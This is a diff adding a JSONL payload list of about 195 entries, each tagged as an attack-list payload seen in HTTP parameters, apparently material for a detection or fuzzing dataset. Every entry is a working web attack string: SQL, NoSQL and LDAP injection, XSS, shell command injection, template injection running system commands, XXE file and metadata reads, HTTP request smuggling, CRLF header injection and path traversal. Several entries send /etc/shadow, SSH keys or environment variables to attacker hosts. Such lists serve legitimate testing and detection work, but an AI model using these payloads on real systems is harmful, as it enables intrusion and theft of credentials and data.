@@ -1,0 +1,195 @@
+{"rid": "s00004", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL) --"}}
+{"rid": "s00034", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<applet onbeforecut=\"alert(1)\" contenteditable>test</applet>"}}
+{"rid": "s00064", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/casper.conf"}}
+{"rid": "s00094", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "; find / -writable -type f"}}
+{"rid": "s00124", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<cite oncopy=\"alert(1)\" contenteditable>test</cite>"}}
+{"rid": "s00154", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\"autofocus/onfocus=alert(1)//"}}
+{"rid": "s00184", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "& cat /etc/shadow | nc attacker.com 4444"}}
+{"rid": "s00214", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| X=$'cat\\x20/etc/passwd'&&$X"}}
+{"rid": "s00244", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/zlib.inflate/resource=/etc/passwd\">]><foo>&xxe;</foo>"}}
+{"rid": "s00274", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/root/anaconda-ks.cfg"}}
+{"rid": "s00304", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 156\nTransfer-Encoding: chunked\n\n0\n\nDELETE /api/users/victim HTTP/1.1\nHost: vulnerable-website.com\nAuthorization: Bearer smuggled-token\nContent-Length: 0"}}
+{"rid": "s00334", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<code id=x tabindex=1 onactivate=alert(1)></code>"}}
+{"rid": "s00364", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "; i${x}d"}}
+{"rid": "s00394", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/ldap/ldap.conf"}}
+{"rid": "s00424", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<acronym onmousemove=\"alert(1)\">test</acronym>"}}
+{"rid": "s00454", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/apt/apt.conf"}}
+{"rid": "s00484", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%- require('child_process').execSync('id').toString() %>"}}
+{"rid": "s00514", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<acronym onmouseover=\"alert(1)\">test</acronym>"}}
+{"rid": "s00544", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<#include \"flag.txt\">"}}
+{"rid": "s00574", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<#assign scanner=input?class.getModule().getClassLoader().loadClass(\"java.util.Scanner\").getConstructor(input?class).newInstance(input).useDelimiter(\"\\\\A\")>"}}
+{"rid": "s00604", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= File.read('/etc/passwd') %>"}}
+{"rid": "s00634", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": ",NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' /*"}}
+{"rid": "s00664", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"10\" y=\"20\">&xxe;</text></svg>"}}
+{"rid": "s00694", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E"}}
+{"rid": "s00724", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts"}}
+{"rid": "s00754", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nTransfer-Encoding: chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\n46\nGET /detection HTTP/1.1\nX-Smuggle-Test: probe\n\n0"}}
+{"rid": "s00784", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%7c%20id"}}
+{"rid": "s00814", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/os-release"}}
+{"rid": "s00844", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/local/apache/logs/mod_jk.log"}}
+{"rid": "s00874", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n72\nGET /login HTTP/1.1\nHost: phishing.com\nX-Poisoned: credential-theft\n\n0"}}
+{"rid": "s00904", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/wu-ftpd/ftpaccess"}}
+{"rid": "s00934", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/local/php4/httpd.conf.php"}}
+{"rid": "s00964", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>"}}
+{"rid": "s00994", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%0d%0aSet-Cookie:sessionid=malicious%0d%0a"}}
+{"rid": "s01024", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/"}}
+{"rid": "s01054", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{dict.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}"}}
+{"rid": "s01084", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<big onpaste=\"alert(1)\" contenteditable>test</big>"}}
+{"rid": "s01114", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/www/logs/freebsddiary-error.log"}}
+{"rid": "s01144", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "&& uname -a"}}
+{"rid": "s01174", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://100.100.100.200/latest/meta-data/ram/security-credentials/\">]><foo>&xxe;</foo>"}}
+{"rid": "s01204", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nTransfer-Encoding: chunked\nTransfer-Encoding: chUnKed\n\n3a\nGET /case HTTP/1.1\nX-Case: mixed\n\n0"}}
+{"rid": "s01234", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}}
+{"rid": "s01264", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) /*"}}
+{"rid": "s01294", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "(&(sn=administrator)(password=MA*))  : KO"}}
+{"rid": "s01324", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= Kernel.`(\"id\") %>"}}
+{"rid": "s01354", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/login.defs"}}
+{"rid": "s01384", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/adm/lp/lpd-errs"}}
+{"rid": "s01414", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/opt/lsws/logs/access.log"}}
+{"rid": "s01444", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<a onmouseup=\"alert(1)\">test</a>"}}
+{"rid": "s01474", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%0d%0aContent-Type:text/html;charset=utf-7"}}
+{"rid": "s01504", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= require('child_process').execSync('id').toString() %>"}}
+{"rid": "s01534", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "',NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' --"}}
+{"rid": "s01564", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "& printenv | curl -X POST -d @- http://attacker.com"}}
+{"rid": "s01594", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/log/authlog"}}
+{"rid": "s01624", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%0d%0aContent-Type:application/xml"}}
+{"rid": "s01654", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= this %>"}}
+{"rid": "s01684", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "1\" AND 1=1"}}
+{"rid": "s01714", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<br ondblclick=\"alert(1)\">test</br>"}}
+{"rid": "s01744", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 78\nTransfer-Encoding: chunked\n\n0\n\nGET /api/internal HTTP/1.1\nHost: vulnerable-website.com\nX-Auth: 1"}}
+{"rid": "s01774", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= IO.read('/etc/passwd') %>"}}
+{"rid": "s01804", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"}}
+{"rid": "s01834", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<select onchange=alert(1)><option>1<option>2"}}
+{"rid": "s01864", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{request|attr(\"application\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"__builtins__\")|attr(\"__getitem__\")(\"__import__\")(\"os\")|attr(\"popen\")(\"id\")|attr(\"read\")()}}"}}
+{"rid": "s01894", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= process.mainModule.require('os').networkInterfaces() %>"}}
+{"rid": "s01924", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])"}}
+{"rid": "s01954", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\"><svg onload=alert(1)//"}}
+{"rid": "s01984", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| cat /etc/passwd"}}
+{"rid": "s02014", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/share/tomcat6/conf/logging.properties"}}
+{"rid": "s02044", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>"}}
+{"rid": "s02074", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%e0%80%8aSet-Cookie:admin=true"}}
+{"rid": "s02104", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nTransfer-Encoding: chunked\n\n2e\nGET /404 HTTP/1.1\nHost: vulnerable-website.com\n\n0"}}
+{"rid": "s02134", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' /*"}}
+{"rid": "s02164", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{lipsum.__globals__['os'].popen('pwd').read()}}"}}
+{"rid": "s02194", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= process.mainModule.require('child_process').exec('env') %>"}}
+{"rid": "s02224", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 92\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/users HTTP/1.1\nHost: vulnerable-website.com\nX-Admin-Session: hijacked"}}
+{"rid": "s02254", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'),NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' --"}}
+{"rid": "s02284", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/bash_completion.d/debconf"}}
+{"rid": "s02314", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{['whoami']|filter('system')}}"}}
+{"rid": "s02344", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nTransfer-Encoding: chunked\nTransfer-Encoding: -chunked\n\n3a\nGET /dash HTTP/1.1\nX-Dash: prefix\n\n0"}}
+{"rid": "s02374", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n84\nGET /socket.io/ HTTP/1.1\nHost: vulnerable-website.com\nUpgrade: websocket\nConnection: Upgrade\n\n0"}}
+{"rid": "s02404", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' --"}}
+{"rid": "s02434", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| a=i;b=d;$a$b"}}
+{"rid": "s02464", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= process.mainModule.require('os').uptime() %>"}}
+{"rid": "s02494", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": ",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)"}}
+{"rid": "s02524", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= require 'open-uri'; open('http://attacker.com').read %>"}}
+{"rid": "s02554", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "&& fetch http://example.com/shell.sh"}}
+{"rid": "s02584", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL) #"}}
+{"rid": "s02614", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}}
+{"rid": "s02644", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}"}}
+{"rid": "s02674", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>"}}
+{"rid": "s02704", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/proc/self/fd/2"}}
+{"rid": "s02734", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n9a\nPOST /api/oauth/token HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\ngrant_type=client_credentials\n0"}}
+{"rid": "s02764", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "|| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com"}}
+{"rid": "s02794", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)"}}
+{"rid": "s02824", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>"}}
+{"rid": "s02854", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "&& %77%68%6f%61%6d%69"}}
+{"rid": "s02884", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/postgresql/log/postgresql.log"}}
+{"rid": "s02914", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/ports/net/pure-ftpd/pureftpd.pdb"}}
+{"rid": "s02944", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--"}}
+{"rid": "s02974", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/wu-ftpd/ftphosts"}}
+{"rid": "s03004", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "& ifconfig"}}
+{"rid": "s03034", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "http://google.com"}}
+{"rid": "s03064", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "login[$gt]=admin&login[$lt]=test&pass[$ne]=1"}}
+{"rid": "s03094", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "C:../../../../../Windows/system32/drivers/etc/hosts"}}
+{"rid": "s03124", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/smi.conf"}}
+{"rid": "s03154", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://ATTACKER-SERVER.com/xxe.dtd\">%xxe;]>"}}
+{"rid": "s03184", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "https://evil.com%0A@victim.com"}}
+{"rid": "s03214", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<video onloadstart=alert(1)><source>"}}
+{"rid": "s03244", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= open(\"|uname -a\").read %>"}}
+{"rid": "s03274", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<applet onreadystatechange=alert(1)></applet>"}}
+{"rid": "s03304", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}}
+{"rid": "s03334", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": ",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)"}}
+{"rid": "s03364", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= global.process %>"}}
+{"rid": "s03394", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://127.0.0.1:27017\" >]><foo>&xxe;</foo>"}}
+{"rid": "s03424", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "test%0d%0aSet-Cookie:admin=true"}}
+{"rid": "s03454", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<applet draggable=\"true\" ondragend=\"alert(1)\">test</applet>"}}
+{"rid": "s03484", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "&  cat /etc/passwd"}}
+{"rid": "s03514", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>"}}
+{"rid": "s03544", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}}"}}
+{"rid": "s03574", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "username[$ne]=toto&password[$regex]=.{1}"}}
+{"rid": "s03604", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\\r\\nETag:injected"}}
+{"rid": "s03634", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/entities/xml-core.cat\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>"}}
+{"rid": "s03664", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/opt/httpd/apache2.conf"}}
+{"rid": "s03694", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| cat /e\\tc/p\\asswd"}}
+{"rid": "s03724", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{phpinfo()}"}}
+{"rid": "s03754", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\"> ]><foo>&xxe;</foo>"}}
+{"rid": "s03784", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "),NULL,NULL,NULL,NULL,NULL) waitfor delay '0:0:20' /*"}}
+{"rid": "s03814", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\",NULL) waitfor delay '0:0:20' --"}}
+{"rid": "s03844", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto"}}
+{"rid": "s03874", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/local/apache/conf/httpd.conf"}}
+{"rid": "s03904", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'); SELECT PG_SLEEP(5)--"}}
+{"rid": "s03934", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<x onxxx=alert(1) 1='"}}
+{"rid": "s03964", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"}}
+{"rid": "s03994", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://192.168.1.1\" >]><foo>&xxe;</foo>"}}
+{"rid": "s04024", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "admin*)((|userPassword=*)"}}
+{"rid": "s04054", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<button draggable=\"true\" ondragenter=\"alert(1)\">test</button>"}}
+{"rid": "s04084", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/var/webmin/miniserv.log"}}
+{"rid": "s04114", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL) /*"}}
+{"rid": "s04144", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "; php -r 'system(\"id\");'"}}
+{"rid": "s04174", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/lib/php/php.ini"}}
+{"rid": "s04204", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "$( id )"}}
+{"rid": "s04234", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/squirrelmail/config/config.php"}}
+{"rid": "s04264", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`"}}
+{"rid": "s04294", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/mysql/my.cnf"}}
+{"rid": "s04324", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "; /???/??t /???/??ss??"}}
+{"rid": "s04354", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/squirrelmail/apache.conf"}}
+{"rid": "s04384", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://c:/windows/php.ini\"> ]><foo>&xxe;</foo>"}}
+{"rid": "s04414", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>"}}
+{"rid": "s04444", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<body onmousedown=\"alert(1)\">test</body>"}}
+{"rid": "s04474", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%00; cat /etc/passwd"}}
+{"rid": "s04504", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "{{{}.__class__.__mro__}}"}}
+{"rid": "s04534", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<acronym onbeforecopy=\"alert(1)\" contenteditable>test</acronym>"}}
+{"rid": "s04564", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<!DOCTYPE data [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/html/schema/html5/common.rnc\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>\">%eval;%error;]>"}}
+{"rid": "s04594", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/sw-cp-server/applications.d/plesk.conf"}}
+{"rid": "s04624", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "%00| cat /etc/passwd"}}
+{"rid": "s04654", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "' or username like char(37);"}}
+{"rid": "s04684", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "| /???/???/ls"}}
+{"rid": "s04714", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= open(\"|env\").read %>"}}
+{"rid": "s04744", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<div>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</div>"}}
+{"rid": "s04774", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<acronym onmouseup=\"alert(1)\">test</acronym>"}}
+{"rid": "s04804", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/logs/security_log"}}
+{"rid": "s04834", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "POST / HTTP/2\nHost: vulnerable-website.com\nContent-Length: 0\n\nGET /.git/config HTTP/1.1"}}
+{"rid": "s04864", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<%= self.instance_variables %>"}}
+{"rid": "s04894", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "..\\\\Windows\\system32\\drivers\\etc\\hosts"}}
+{"rid": "s04924", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "\" OR 1=1;/*"}}
+{"rid": "s04954", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL) #"}}
+{"rid": "s04984", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/usr/local/psa/admin/conf/php.ini"}}
+{"rid": "s05014", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<applet onmouseleave=\"alert(1)\">test</applet>"}}
+{"rid": "s05044", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "/etc/squirrelmail/sqspell_config.php"}}
+{"rid": "s05074", "item": {"kind": "attack-list payload, seen in an HTTP parameter or body", "payload": "<acronym oncontextmenu=\"alert(1)\">test</acronym>"}}
